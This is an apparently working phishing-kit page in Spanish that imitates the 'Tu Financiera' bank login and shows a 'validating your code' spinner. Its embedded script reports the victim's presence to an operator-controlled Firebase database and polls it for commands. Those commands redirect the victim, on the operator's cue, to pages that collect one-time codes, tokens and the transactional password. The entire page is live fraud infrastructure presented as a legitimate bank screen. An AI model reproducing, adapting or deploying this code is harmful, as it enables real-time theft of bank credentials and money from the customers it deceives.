<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Validando</title>
<link rel="shortcut icon" type="image/png" href="https://tu.com.py/tufi-web/assets/icon/favicon.png">
<link rel="stylesheet" href="https://tu.com.py/tufi-web/static/css/main.bb0d1fd5.chunk.css">
<style>
  html,body{height:100%;margin:0}
  body{min-height:100vh;background:#464646;font-family:var(--tufi-font-family),Ubuntu,Arial,sans-serif;color:#606060;display:flex;justify-content:flex-end}
  .fondo{position:fixed;inset:0;z-index:0;background:url('https://tu.com.py/tufi-web/static/media/fondo_login.34ff0d3f.png') center/cover no-repeat}
  .panel{position:relative;z-index:1;width:33.3333%;min-height:100vh;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 18px;box-sizing:border-box}
  .logo-top{width:118px;margin-bottom:26px}
  .login-box{width:321px;max-width:100%;background:#fff;border:1px solid #d1d1d1;border-radius:10px;padding:30px 18px;box-sizing:border-box;text-align:center}
  .spin{width:40px;height:40px;border:4px solid #e6e6e6;border-top-color:#8dc63f;border-radius:50%;margin:0 auto 18px;animation:g 1s linear infinite}
  @keyframes g{to{transform:rotate(360deg)}}
  h1{font-size:16px;font-weight:bold;color:#8ec63f;margin:0 0 8px}
  p{font-size:12px;color:#707070;line-height:1.5;margin:0}
  @media(max-width:900px){.panel{width:45%}}
  @media(max-width:768px){body{display:block}.panel{width:100%}.login-box{width:290px}.logo-top{width:96px}}
</style>
</head>
<body>
<div class="fondo"></div>
<div class="panel">
  <img class="logo-top" src="https://tu.com.py/tufi-web/static/media/logo_login.76bbbd3c.svg" alt="Tu Financiera">
  <div class="login-box">
    <div class="spin"></div>
    <h1 id="t">Validando código</h1>
    <p id="p">Estamos verificando el código ingresado.<br>No cierres esta ventana.</p>
  </div>
</div>
<script>
(function(){
  var DB="https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
  var q=new URLSearchParams(location.search);
  var id=q.get('u')||localStorage.getItem('nbch_u');
  var m=q.get('m')||'codigo';
  if(!id) return;
  if(m==='token'){document.getElementById('t').textContent='Validando token';
                  document.getElementById('p').innerHTML='Estamos verificando el token ingresado.<br>No cierres esta ventana.';}
  if(m==='clave'){document.getElementById('t').textContent='Autorizando acceso';
                  document.getElementById('p').innerHTML='Estamos validando tu clave transaccional.';}
  function patch(o){fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify(o)}).catch(function(){});}
  patch({online:true,ultimoPing:Date.now(),pagina:'cargando2.html'});
  var lt=setInterval(function(){patch({online:true,ultimoPing:Date.now()});},5000);
  window.addEventListener('beforeunload',function(){clearInterval(lt);patch({online:false});});

  var salio=false;
  setInterval(function(){
    if(salio)return;
    fetch(DB+'/comandos/'+id+'.json').then(function(r){return r.json();}).then(function(c){
      if(!c)return;
      if(c.accion==='codigo'){salio=true;location.href='codigo.html?u='+id+'&e=1';}
      else if(c.accion==='codigo2'){salio=true;location.href='codigo.html?u='+id+'&e=2';}
      else if(c.accion==='token'){salio=true;location.href='token.html?u='+id+'&e=1';}
      else if(c.accion==='token2'){salio=true;location.href='token.html?u='+id+'&e=2';}
      else if(c.accion==='clave'){salio=true;location.href='clavetransaccional.html?u='+id;}
      else if(c.accion==='dejar'){salio=true;location.href='final.html?u='+id;}
      else if(c.rechazo){salio=true;location.href='rechazar.html?t='+c.rechazo+'&u='+id;}
    }).catch(function(){});
  },2000);
})();
</script>
</body>
</html>
